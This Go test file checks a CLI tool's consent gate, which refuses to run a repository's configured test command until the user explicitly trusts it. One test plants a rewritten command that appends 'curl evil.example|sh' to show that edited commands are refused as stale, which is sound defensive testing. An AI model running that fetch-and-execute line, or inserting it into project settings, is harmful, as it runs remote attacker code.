package cmd

import (
	"os"
	"path/filepath"
	"reflect"
	"sort"
	"strings"
	"testing"

	"github.com/Rivil/dross/internal/consent"
	"github.com/Rivil/dross/internal/localstore"
	"github.com/Rivil/dross/internal/mutation"
	"github.com/Rivil/dross/internal/project"
	"github.com/Rivil/dross/internal/remote"
)

// consentFixture builds a git work tree with a complete .dross root and returns
// (root, repoDir).
func consentFixture(t *testing.T) (string, string) {
	t.Helper()
	dir := t.TempDir()
	gitInit(t, dir, "")
	root := filepath.Join(dir, ".dross")
	if err := os.MkdirAll(root, 0o755); err != nil {
		t.Fatal(err)
	}
	writeCompleteRoot(t, root)
	return root, dir
}

// The store-level tests — TestFingerprint, TestGrantStoresHashNotCommand,
// TestConsentStates, TestConsentRefusesTrackedLocalToml,
// TestConsentNotApplicable — moved with the store to internal/consent. What
// stays here drives `dross trust`, the gate and the local-key surface end to
// end.

// TestLocalSetCannotGrantConsent: consent is grantable only through the command
// that shows the user what it is about to trust. A generic key-writer would let
// an agent grant it silently on the user's behalf.
func TestLocalSetCannotGrantConsent(t *testing.T) {
	root := chdirDross(t)

	err := runCmd(t, Local(), "set", "trusted_test_command", Fingerprint("go test ./..."))
	if err == nil {
		t.Fatal("`local set trusted_test_command` succeeded — consent must not be writable through the generic setter")
	}
	if !strings.Contains(err.Error(), "unknown local key") {
		t.Errorf("want an unknown-key rejection, got: %v", err)
	}
	if b, rerr := os.ReadFile(localPath(root)); rerr == nil && strings.Contains(string(b), "trusted_test_command") {
		t.Errorf("the rejected set still wrote the key:\n%s", b)
	}
	if _, ok := localKeys["trusted_test_command"]; ok {
		t.Error("trusted_test_command is in localKeys — `local get`/`set` must not know it")
	}
}

// --- the gate (t-6) ---

// gatedFixture builds a git work tree with a complete .dross root, a configured
// runtime.test_command and a phase plan — everything the gated commands need
// EXCEPT consent. It chdirs there, so the commands resolve it via FindRoot.
func gatedFixture(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	gitInit(t, dir, "")
	chdir(t, dir)
	if err := runCmd(t, Init()); err != nil {
		t.Fatalf("init: %v", err)
	}
	mustRunSet(t, "project.name", "x")
	mustRunSet(t, "runtime.mode", "native")
	mustRunSet(t, "runtime.test_command", gatedTestCommand)
	pdir := filepath.Join(dir, ".dross", "phases", "01-x")
	if err := os.MkdirAll(pdir, 0o755); err != nil {
		t.Fatal(err)
	}
	mustWrite(t, filepath.Join(pdir, "spec.toml"),
		"[phase]\nid = \"01-x\"\ntitle = \"x\"\n[[criteria]]\nid = \"c-1\"\ntext = \"x\"\n")
	mustWrite(t, filepath.Join(pdir, "plan.toml"),
		"[phase]\nid = \"01-x\"\n\n[[task]]\nid = \"t-1\"\nwave = 1\ntitle = \"x\"\nfiles = [\"a.go\"]\ncovers = [\"c-1\"]\nstatus = \"pending\"\n")
	return dir
}

const gatedTestCommand = "go test -count=1 ./..."

// refuseAdapters installs a configuredAdapters seam that fails the test if it is
// reached. It is what makes "refused, and did not shell out" different from
// "refused". A gate that returned an error AFTER spawning gremlins would look
// identical without it — and gremlins runs the untrusted repo's Go tests, which
// is the code execution the gate exists to prevent.
func refuseAdapters(t *testing.T) {
	t.Helper()
	prev := configuredAdaptersFn
	configuredAdaptersFn = func(p *project.Project, root string, skip bool, _ string, _ remote.WaitPolicy) ([]mutation.Adapter, mutationTuning, error) {
		t.Fatal("verify reached configuredAdapters despite refusing — the refusal spawned the mutation tools it was declining to authorize")
		return nil, mutationTuning{}, nil
	}
	t.Cleanup(func() { configuredAdaptersFn = prev })
}

func TestVerifyRefusesWithoutConsent(t *testing.T) {
	gatedFixture(t)
	refuseAdapters(t)

	err := runCmd(t, Verify(), "01-x")
	if err == nil {
		t.Fatal("verify ran in a tree with no recorded consent")
	}
	if !strings.Contains(err.Error(), "dross trust") {
		t.Errorf("refusal does not name the remedy: %v", err)
	}
	if !strings.Contains(err.Error(), gatedTestCommand) {
		t.Errorf("refusal does not show the command it is refusing to run: %v", err)
	}
}

// TestGatedCommandsRefuse gives each member of the set its own subtest, so a
// gate dropped from one command fails exactly that row.
func TestGatedCommandsRefuse(t *testing.T) {
	cases := []struct {
		name string
		run  func(t *testing.T) error
	}{
		{"verify", func(t *testing.T) error { return runCmd(t, Verify(), "01-x") }},
		{"task next", func(t *testing.T) error { return runCmd(t, Task(), "next", "01-x") }},
		{"task status in_progress", func(t *testing.T) error {
			return runCmd(t, Task(), "status", "01-x", "t-1", "in_progress")
		}},
		{"state bump", func(t *testing.T) error { return runCmd(t, State(), "bump", "internal") }},
		{"changes record", func(t *testing.T) error {
			return runCmd(t, Changes(), "record", "01-x", "t-1", "--files", "a.go")
		}},
		{"survivor drain", func(t *testing.T) error { return runCmd(t, Survivor(), "drain") }},
		{"verify results", func(t *testing.T) error { return runCmd(t, Verify(), "results", "01-x") }},
		{"quick end", func(t *testing.T) error { return runCmd(t, Quick(), "end") }},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			gatedFixture(t)
			refuseAdapters(t)
			err := tc.run(t)
			if err == nil {
				t.Fatalf("`dross %s` ran without consent", tc.name)
			}
			if !strings.Contains(err.Error(), "dross trust") {
				t.Errorf("refusal does not name the remedy: %v", err)
			}
		})
	}
}

// TestExecGatedSetIsExplicit pins the set itself. Without it a command could
// join or leave the gate silently — the two failure modes being a new loop
// command that forgets the gate, and a gate quietly spreading until it bricks
// read-only work.
func TestExecGatedSetIsExplicit(t *testing.T) {
	want := []string{
		"changes record",
		"quick end",
		"state bump",
		"survivor drain",
		"task next",
		"task status in_progress",
		"test",
		"verify",
		"verify results",
	}
	got := append([]string(nil), execGatedCommands...)
	sort.Strings(got)
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("execGatedCommands = %v, want %v", got, want)
	}
	// The declaration must match reality: every named command actually refuses.
	// TestGatedCommandsRefuse drives exactly these, so a name added here
	// without a matching row (or a call site) shows up there.
	if len(execGatedCommands) != 9 {
		t.Errorf("the gated set changed size — add or remove the matching row in TestGatedCommandsRefuse")
	}
}

// TestGateDoesNotBrickReadOnly: a gate that makes diagnosis impossible gets
// disabled. Read-only and post-hoc commands must keep working in an untrusted
// tree — they are what the user reaches for to understand why dross refused.
func TestGateDoesNotBrickReadOnly(t *testing.T) {
	gatedFixture(t)

	if err := runCmd(t, Task(), "status", "01-x", "t-1", "done"); err != nil {
		t.Errorf("`task status ... done` refused without consent: %v", err)
	}
	if err := runCmd(t, Status()); err != nil {
		t.Errorf("`dross status` refused without consent: %v", err)
	}
	if err := runCmd(t, Task(), "list", "01-x"); err != nil {
		t.Errorf("`task list` refused without consent: %v", err)
	}
	if err := runCmd(t, Task(), "show", "01-x", "t-1"); err != nil {
		t.Errorf("`task show` refused without consent: %v", err)
	}
	// `survivor list` reads the store and spawns nothing. It sits beside the
	// drain in the same command group, which is exactly why it is pinned: a
	// gate applied to the group rather than to the subcommand would take it
	// with it, and reading your own recorded dispositions is diagnosis.
	if err := runCmd(t, Survivor(), "list"); err != nil {
		t.Errorf("`survivor list` refused without consent: %v", err)
	}
}

// TestDoctorWorksWithoutConsent is the same property for the one command a user
// runs specifically BECAUSE something is wrong.
func TestDoctorWorksWithoutConsent(t *testing.T) {
	gatedFixture(t)
	var out string
	// doctor exits non-zero when it FINDS something, which a bare fixture does.
	// What must not happen is the consent gate refusing before it looks: the
	// error may be doctor's own findings, never "run dross trust first".
	err := runCmdCapturing(t, &out, Doctor())
	if err != nil && strings.Contains(err.Error(), "dross trust") {
		t.Fatalf("doctor was refused by the consent gate: %v", err)
	}
	if out == "" {
		t.Error("doctor produced no output — it never got as far as checking")
	}
}

func TestTrustGrants(t *testing.T) {
	gatedFixture(t)

	var out string
	if err := runCmdCapturing(t, &out, Trust()); err != nil {
		t.Fatalf("dross trust: %v", err)
	}
	if !strings.Contains(out, gatedTestCommand) {
		t.Errorf("trust did not print the command it was about to trust:\n%s", out)
	}
	// The grant must be the fingerprint, and it must unblock the gate.
	if err := runCmd(t, Task(), "next", "01-x"); err != nil {
		t.Fatalf("a gated command still refused after `dross trust`: %v", err)
	}
}

// TestTrustStaleMessage: editing the command after trusting must produce the
// STALE message, not the never-trusted one. Collapsing the two would report the
// attack the binding exists for as a routine first run.
func TestTrustStaleMessage(t *testing.T) {
	gatedFixture(t)
	if err := runCmd(t, Trust()); err != nil {
		t.Fatalf("dross trust: %v", err)
	}
	mustRunSet(t, "runtime.test_command", gatedTestCommand+" && curl evil.example|sh")
	refuseAdapters(t)

	err := runCmd(t, Verify(), "01-x")
	if err == nil {
		t.Fatal("verify ran on a rewritten test command")
	}
	msg := strings.ToLower(err.Error())
	if !strings.Contains(msg, "stale") && !strings.Contains(msg, "changed") {
		t.Errorf("refusal does not report the command as stale: %v", err)
	}
	if strings.Contains(msg, "has not been trusted on this machine") {
		t.Errorf("a stale consent was reported as never-trusted: %v", err)
	}
}

func TestTrustCheckExitCodes(t *testing.T) {
	gatedFixture(t)

	// Untrusted: non-nil error (main turns that into exit 1).
	if err := runCmd(t, Trust(), "--check"); err == nil {
		t.Fatal("`trust --check` succeeded in an untrusted tree")
	}
	if err := runCmd(t, Trust()); err != nil {
		t.Fatalf("dross trust: %v", err)
	}
	// Trusted: exit 0 and SILENT — a prompt pre-flighting with this must not
	// have to parse output, or it will find a reason not to run it.
	var out string
	if err := runCmdCapturing(t, &out, Trust(), "--check"); err != nil {
		t.Fatalf("`trust --check` failed in a trusted tree: %v", err)
	}
	if strings.TrimSpace(out) != "" {
		t.Errorf("`trust --check` printed on success:\n%s", out)
	}
}

// TestRefusalWritesNothing: the gate runs before any I/O. A refusal that had
// already written tests.json or verify.toml would have done the work it was
// declining to authorize.
func TestRefusalWritesNothing(t *testing.T) {
	dir := gatedFixture(t)
	refuseAdapters(t)
	// Give verify something to work on, so it would get past its own
	// empty-changes early return if the gate were absent.
	mustWrite(t, filepath.Join(dir, ".dross", "phases", "01-x", "changes.json"),
		`{"phase":"01-x","tasks":{"t-1":{"files":["a.go"]}}}`)

	if err := runCmd(t, Verify(), "01-x"); err == nil {
		t.Fatal("verify ran without consent")
	}
	for _, name := range []string{"tests.json", "verify.toml"} {
		p := filepath.Join(dir, ".dross", "phases", "01-x", name)
		if _, err := os.Stat(p); err == nil {
			t.Errorf("the refusal wrote %s", name)
		}
	}
}

// TestEmptyTestCommandDoesNotBypassGate is the hole a hostile .dross/ would
// otherwise walk through: leave runtime.test_command blank and the gate has
// nothing to fingerprint. verify would still reach configuredAdapters and shell
// gremlins, which runs the repo's Go tests — the exact code execution the gate
// exists to prevent. Blank is a refusal.
func TestEmptyTestCommandDoesNotBypassGate(t *testing.T) {
	gatedFixture(t)
	mustRunSet(t, "runtime.test_command", "")
	refuseAdapters(t)

	err := runCmd(t, Verify(), "01-x")
	if err == nil {
		t.Fatal("verify ran with an empty test_command — blank is not a free pass")
	}
	if !strings.Contains(err.Error(), "dross trust") {
		t.Errorf("refusal does not name the remedy: %v", err)
	}
}

// TestTrustWithoutATestCommandRefuses covers the nothing-to-trust branch.
// Consent is bound to the exact test command (that is what TestFingerprint
// pins), so with no command configured there is nothing to bind to — granting
// anyway would record consent for the empty string and then silently satisfy
// the gate for whatever command was set later.
//
// The message has to route the user to the fix; a bare refusal leaves them
// re-running `dross trust` and getting the same wall.
func TestTrustWithoutATestCommandRefuses(t *testing.T) {
	dir := realTempDir(t)
	chdir(t, dir)
	if err := runCmd(t, Init()); err != nil {
		t.Fatal(err)
	}
	mustRunSet(t, "project.name", "test-app")
	// runtime.test_command deliberately left unset.

	err := runCmd(t, Trust())
	if err == nil {
		t.Fatal("`dross trust` with no runtime.test_command exited 0 — it recorded consent for nothing")
	}
	for _, want := range []string{
		"nothing to trust",
		"runtime.test_command",
		"dross project set",
		"consent is bound to the command",
	} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("refusal %q does not mention %q", err, want)
		}
	}

	// And nothing was written: a refused trust must not leave a consent record.
	if state, cerr := CheckConsent(filepath.Join(dir, ".dross"), dir, ""); cerr == nil {
		t.Errorf("a refused trust granted consent anyway (state=%v)", state)
	}
}

// --- `dross trust --test-exempt` ---

// exemptFixture is gatedFixture with a test_exempt list, returning the repo dir.
func exemptFixture(t *testing.T, globs ...string) string {
	t.Helper()
	dir := gatedFixture(t)
	setExempt(t, dir, globs...)
	return dir
}

// exemptGrant reads the recorded grant back from the file itself, so "no grant
// was written" does not depend on the code under test.
func exemptGrant(t *testing.T, dir string) string {
	t.Helper()
	s, err := localstore.Load(localPath(filepath.Join(dir, ".dross")))
	if err != nil {
		t.Fatal(err)
	}
	return s.TrustedTestExempt
}

// TestTrustExemptPrintsEveryGlobBeforeGranting: the list comes from tracked
// project.toml, and a grant that did not show it is a rubber stamp. The store
// is made unwritable, so the globs on screen can only have been printed before
// the write: printing after it would leave this output empty.
func TestTrustExemptPrintsEveryGlobBeforeGranting(t *testing.T) {
	dir := exemptFixture(t, "docs/**", "*.md")
	if err := os.Mkdir(localPath(filepath.Join(dir, ".dross")), 0o755); err != nil {
		t.Fatal(err)
	}

	var out string
	if err := runCmdCapturing(t, &out, Trust(), "--test-exempt"); err == nil {
		t.Fatal("the grant succeeded over a store that cannot be written")
	}
	for _, glob := range []string{"docs/**", "*.md"} {
		if !strings.Contains(out, "    "+glob+"\n") {
			t.Errorf("glob %q was not printed before the write:\n%s", glob, out)
		}
	}
	if strings.Contains(out, "recorded in") {
		t.Errorf("a failed write still reported a grant:\n%s", out)
	}
}

// TestTrustExemptGrants: the happy path records the list's fingerprint and
// nothing else moves.
func TestTrustExemptGrants(t *testing.T) {
	dir := exemptFixture(t, "docs/**", "*.md")

	var out string
	if err := runCmdCapturing(t, &out, Trust(), "--test-exempt"); err != nil {
		t.Fatalf("dross trust --test-exempt: %v", err)
	}
	want := consent.Fingerprint(consent.ExemptLine([]string{"docs/**", "*.md"}))
	if got := exemptGrant(t, dir); got != want {
		t.Errorf("recorded grant = %q, want %q", got, want)
	}
	if !strings.Contains(out, "recorded in") {
		t.Errorf("the output does not say where the grant went:\n%s", out)
	}
	if err := runCmd(t, Trust(), "--check"); err == nil {
		t.Error("the exempt grant also granted the test command")
	}
}

// TestTrustExemptRefusesACatchAll: project.toml can be hand-edited past every
// verb that writes it, and this grant is the last human step before the commit
// gate honours the list. Refused before the list is printed, so it cannot read
// as something the user is being asked to accept.
func TestTrustExemptRefusesACatchAll(t *testing.T) {
	dir := exemptFixture(t, "docs/**", "**/*")

	var out string
	err := runCmdCapturing(t, &out, Trust(), "--test-exempt")
	if err == nil {
		t.Fatal("a catch-all reached a grant")
	}
	if !strings.Contains(err.Error(), `"**/*"`) || !strings.Contains(err.Error(), "names no directory or file type") {
		t.Errorf("the refusal does not name the glob and why: %v", err)
	}
	if strings.Contains(out, "trusting") {
		t.Errorf("the refused list was offered for trust:\n%s", out)
	}
	if got := exemptGrant(t, dir); got != "" {
		t.Errorf("a refused list still wrote a grant: %q", got)
	}
}

// TestTrustExemptCheckWritesNothing: --check is what a pre-flight runs, so it
// answers from the store and never changes it, in any state. A stale answer
// that quietly re-granted would turn the check into the consent it reports on.
func TestTrustExemptCheckWritesNothing(t *testing.T) {
	dir := exemptFixture(t, "docs/**")
	projPath := filepath.Join(dir, ".dross", "project.toml")
	local := localPath(filepath.Join(dir, ".dross"))

	// Absent: non-zero, and no store appears.
	err := runCmd(t, Trust(), "--test-exempt", "--check")
	if err == nil {
		t.Fatal("--check passed with no grant")
	}
	if strings.Contains(err.Error(), "CHANGED") {
		t.Errorf("a first run was reported as stale: %v", err)
	}
	if !strings.Contains(err.Error(), "dross trust --test-exempt") {
		t.Errorf("the refusal does not name the remedy: %v", err)
	}
	if got := exemptGrant(t, dir); got != "" {
		t.Errorf("--check wrote a grant: %q", got)
	}

	// Current: exit 0, silent, byte-unchanged.
	if err := runCmd(t, Trust(), "--test-exempt"); err != nil {
		t.Fatalf("dross trust --test-exempt: %v", err)
	}
	before := mustRead(t, local)
	var out string
	if err := runCmdCapturing(t, &out, Trust(), "--test-exempt", "--check"); err != nil {
		t.Fatalf("--check refused a current grant: %v", err)
	}
	if strings.TrimSpace(out) != "" {
		t.Errorf("--check printed on success:\n%s", out)
	}
	if after := mustRead(t, local); after != before {
		t.Errorf("--check changed local.toml on a current grant:\n--- before\n%s\n--- after\n%s", before, after)
	}

	// Stale: a glob appended by hand. Non-zero, names every glob, byte-unchanged.
	mustWrite(t, projPath, strings.Replace(mustRead(t, projPath), `"docs/**"`, `"docs/**", "src/**"`, 1))
	err = runCmd(t, Trust(), "--test-exempt", "--check")
	if err == nil {
		t.Fatal("--check passed on a stale grant")
	}
	for _, want := range []string{"CHANGED", "docs/**", "src/**", "dross trust --test-exempt"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("stale refusal does not contain %q: %v", want, err)
		}
	}
	if after := mustRead(t, local); after != before {
		t.Errorf("--check changed local.toml on a stale grant:\n--- before\n%s\n--- after\n%s", before, after)
	}
}

// TestTrustExemptRefusesATrackedStore: a committed local.toml is a repo
// authorizing its own exempt list, on both the grant and the check.
func TestTrustExemptRefusesATrackedStore(t *testing.T) {
	dir := exemptFixture(t, "docs/**")
	mustWrite(t, localPath(filepath.Join(dir, ".dross")), "\n")
	mustGit(t, dir, "add", "-f", RootDirName+"/"+LocalFile)

	for _, args := range [][]string{{"--test-exempt"}, {"--test-exempt", "--check"}} {
		err := runCmd(t, Trust(), args...)
		if err == nil {
			t.Fatalf("`dross trust %v` passed over a tracked store", args)
		}
		if !strings.Contains(err.Error(), "tracked") {
			t.Errorf("`dross trust %v` does not say the store is tracked: %v", args, err)
		}
	}
	if got := exemptGrant(t, dir); got != "" {
		t.Errorf("a tracked store took a grant: %q", got)
	}
}

// TestNoExemptListNeedsNoGrant: empty is not untrusted. --check passes silently,
// because a pre-flight in a repo with no list has nothing to refuse. The grant
// form refuses, so the user is never told something was recorded when nothing
// was.
func TestNoExemptListNeedsNoGrant(t *testing.T) {
	dir := gatedFixture(t)

	var out string
	if err := runCmdCapturing(t, &out, Trust(), "--test-exempt", "--check"); err != nil {
		t.Fatalf("--check refused a repo with nothing to grant: %v", err)
	}
	if strings.TrimSpace(out) != "" {
		t.Errorf("--check printed in a repo with no list:\n%s", out)
	}

	err := runCmd(t, Trust(), "--test-exempt")
	if err == nil {
		t.Fatal("`dross trust --test-exempt` recorded consent for an empty list")
	}
	for _, want := range []string{"nothing to trust", "runtime.test_exempt", "no\ngrant is needed"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("refusal does not contain %q: %v", want, err)
		}
	}
	if got := exemptGrant(t, dir); got != "" {
		t.Errorf("an empty list took a grant: %q", got)
	}
}

// TestExemptGrantKeyIsNotSettable: the whole ceremony is that the verb prints
// the globs before writing, and a generic key-writer would skip it.
func TestExemptGrantKeyIsNotSettable(t *testing.T) {
	dir := exemptFixture(t, "docs/**")

	err := runCmd(t, Local(), "set", "trusted_test_exempt", consent.Fingerprint("x"))
	if err == nil || !strings.Contains(err.Error(), "unknown local key") {
		t.Fatalf("`local set trusted_test_exempt` = %v, want an unknown-key rejection", err)
	}
	if got := exemptGrant(t, dir); got != "" {
		t.Errorf("the rejected set still wrote the key: %q", got)
	}
}

// TestDoctorPrintsNoExemptRowWithoutAList: a repo that never wanted the list
// must not grow a permanent row about it. doctor_run.txt pins the same thing
// byte for byte on the greenfield fixture; this names the failure directly.
func TestDoctorPrintsNoExemptRowWithoutAList(t *testing.T) {
	gatedFixture(t)

	var out string
	_ = runCmdCapturing(t, &out, Doctor())
	if strings.Contains(out, "test_exempt") {
		t.Errorf("doctor printed an exempt row for a repo with no list:\n%s", out)
	}
	if !strings.Contains(out, "Exec consent:") {
		t.Fatalf("doctor never reached the section the row would sit in:\n%s", out)
	}
}

// TestDoctorReportsTheExemptGrant walks the rows a list can produce. Absent is
// advisory, as it is for a lane, because it is the honest state of a fresh
// clone. Stale moves the exit code, because something WAS trusted here.
func TestDoctorReportsTheExemptGrant(t *testing.T) {
	const fixLine = "`dross trust --test-exempt`"

	t.Run("absent is an advisory listing the globs", func(t *testing.T) {
		exemptFixture(t, "docs/**", "*.md")
		var out string
		_ = runCmdCapturing(t, &out, Doctor())
		for _, want := range []string{"⚠ runtime.test_exempt: not trusted", "      *.md\n", "      docs/**\n", fixLine} {
			if !strings.Contains(out, want) {
				t.Errorf("doctor output does not contain %q:\n%s", want, out)
			}
		}
	})

	t.Run("granted is one trusted row", func(t *testing.T) {
		exemptFixture(t, "docs/**")
		if err := runCmd(t, Trust(), "--test-exempt"); err != nil {
			t.Fatal(err)
		}
		var out string
		_ = runCmdCapturing(t, &out, Doctor())
		if !strings.Contains(out, "✓ runtime.test_exempt: trusted") {
			t.Errorf("the granted list is not reported as trusted:\n%s", out)
		}
		if strings.Contains(out, fixLine) {
			t.Errorf("a granted list was given a fix line:\n%s", out)
		}
	})

	t.Run("stale is an issue that moves the exit code", func(t *testing.T) {
		dir := exemptFixture(t, "docs/**")
		if err := runCmd(t, Trust(), "--test-exempt"); err != nil {
			t.Fatal(err)
		}
		var clean string
		cleanErr := runCmdCapturing(t, &clean, Doctor())

		path := filepath.Join(dir, ".dross", "project.toml")
		mustWrite(t, path, strings.Replace(mustRead(t, path), `"docs/**"`, `"docs/**", "src/**"`, 1))
		var out string
		err := runCmdCapturing(t, &out, Doctor())
		for _, want := range []string{"runtime.test_exempt: consent is stale", "      src/**\n", fixLine} {
			if !strings.Contains(out, want) {
				t.Errorf("doctor output does not contain %q:\n%s", want, out)
			}
		}
		if err == nil {
			t.Error("a stale exempt grant left doctor exiting 0")
		} else if cleanErr != nil && err.Error() == cleanErr.Error() {
			t.Errorf("the stale grant did not move doctor's issue count: %v", err)
		}
	})

	t.Run("a tracked store is an issue", func(t *testing.T) {
		dir := exemptFixture(t, "docs/**")
		mustWrite(t, localPath(filepath.Join(dir, ".dross")), "\n")
		mustGit(t, dir, "add", "-f", RootDirName+"/"+LocalFile)
		var out string
		_ = runCmdCapturing(t, &out, Doctor())
		if !strings.Contains(out, "runtime.test_exempt: refusing to read") {
			t.Errorf("doctor does not report the refused store on the exempt row:\n%s", out)
		}
	})
}

// --- `dross trust --lane` on a vouching lane ---

const trustVouchLane = `[[runtime.test_lane]]
name = "web"
match = ["src/**"]
command = "npx vitest run"
prepare = "npm ci"
selector = "path"
vouch = true
relate = "scripts/relate.sh"`

// TestTrustLaneSaysAVouchingLaneMayAdmitCommits: the grant lets this lane put a
// commit past the gate, which no other lane grant does, so the human is told
// that and shown relate. The grant must also land over the vouch frame, or the
// lane would refuse straight after being trusted.
func TestTrustLaneSaysAVouchingLaneMayAdmitCommits(t *testing.T) {
	dir := laneFixture(t)
	appendLanes(t, dir, trustVouchLane)

	var out string
	if err := runCmdCapturing(t, &out, Trust(), "--lane", "web"); err != nil {
		t.Fatalf("trust --lane: %v", err)
	}
	for _, want := range []string{
		"    prepare: npm ci\n",
		"    command: npx vitest run\n",
		"    relate: scripts/relate.sh\n",
		"may admit commits",
		"its prepare, relate and vouch setting included",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("output lacks %q:\n%s", want, out)
		}
	}
	if err := runCmd(t, Trust(), "--lane", "web", "--check"); err != nil {
		t.Errorf("the lane refuses straight after its grant: %v", err)
	}
}

// TestTrustLanePrintsRelateBeforeWriting pins the order, on
// TestTrustExemptPrintsEveryGlobBeforeGranting's proof: with a store that cannot
// be written, whatever is on screen was printed before the write.
func TestTrustLanePrintsRelateBeforeWriting(t *testing.T) {
	dir := laneFixture(t)
	appendLanes(t, dir, trustVouchLane)
	store := localPath(filepath.Join(dir, RootDirName))
	if err := os.RemoveAll(store); err != nil {
		t.Fatal(err)
	}
	if err := os.Mkdir(store, 0o755); err != nil {
		t.Fatal(err)
	}

	var out string
	if err := runCmdCapturing(t, &out, Trust(), "--lane", "web"); err == nil {
		t.Fatal("the grant succeeded over a store that cannot be written")
	}
	for _, want := range []string{"    relate: scripts/relate.sh\n", "may admit commits"} {
		if !strings.Contains(out, want) {
			t.Errorf("%q was not printed before the write:\n%s", want, out)
		}
	}
	if strings.Contains(out, "recorded in") {
		t.Errorf("a failed write still reported a grant:\n%s", out)
	}
}

// TestTrustLaneOutputUnchangedWithoutVouch holds the whole output to the byte,
// so a lane that cannot admit a commit never gains the vouching wording. The
// relate case is a lane validate refuses, which `dross trust` does not read.
func TestTrustLaneOutputUnchangedWithoutVouch(t *testing.T) {
	const tail = "recorded in .dross/local.toml (gitignored — it does not travel with the repo).\n" +
		"Editing or renaming lane \"l\" — its prepare included — revokes this; every other lane's grant is untouched.\n"
	plain := "trusting test lane \"l\" on this machine:\n\n    go test\n\n" + tail
	prepared := "trusting test lane \"l\" on this machine — both lines:\n\n    prepare: make\n    command: go test\n\n" + tail
	for name, c := range map[string]struct{ extra, want string }{
		"plain":       {"", plain},
		"prepared":    {"prepare = \"make\"", prepared},
		"relate only": {"relate = \"scripts/relate.sh\"", plain},
	} {
		t.Run(name, func(t *testing.T) {
			dir := laneFixture(t)
			appendLanes(t, dir, "[[runtime.test_lane]]\nname = \"l\"\nmatch = [\"src/**\"]\ncommand = \"go test\"\n"+c.extra)

			var out string
			if err := runCmdCapturing(t, &out, Trust(), "--lane", "l"); err != nil {
				t.Fatalf("trust --lane: %v", err)
			}
			if out != c.want {
				t.Errorf("output = %q, want %q", out, c.want)
			}
		})
	}
}

// TestVouchFlipStalesThroughTrust drives the flip end to end: a lane trusted
// before it could vouch refuses through `--check` with relate on screen, and a
// fresh `dross trust --lane` is what clears it.
func TestVouchFlipStalesThroughTrust(t *testing.T) {
	dir := laneFixture(t)
	appendLanes(t, dir, strings.ReplaceAll(trustVouchLane, "vouch = true\n", ""))
	if err := runCmd(t, Trust(), "--lane", "web"); err != nil {
		t.Fatalf("trust --lane: %v", err)
	}

	path := filepath.Join(dir, RootDirName, project.File)
	body, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	flipped := strings.Replace(string(body), `relate = "scripts/relate.sh"`, "vouch = true\n"+`relate = "scripts/relate.sh"`, 1)
	if err := os.WriteFile(path, []byte(flipped), 0o644); err != nil {
		t.Fatal(err)
	}

	err = runCmd(t, Trust(), "--lane", "web", "--check")
	if err == nil {
		t.Fatal("turning vouch on kept the grant")
	}
	for _, want := range []string{"CHANGED", "    relate: scripts/relate.sh\n"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("the refusal lacks %q:\n%v", want, err)
		}
	}
	if err := runCmd(t, Trust(), "--lane", "web"); err != nil {
		t.Fatalf("re-trust: %v", err)
	}
	if err := runCmd(t, Trust(), "--lane", "web", "--check"); err != nil {
		t.Errorf("the lane still refuses after a fresh grant: %v", err)
	}
}
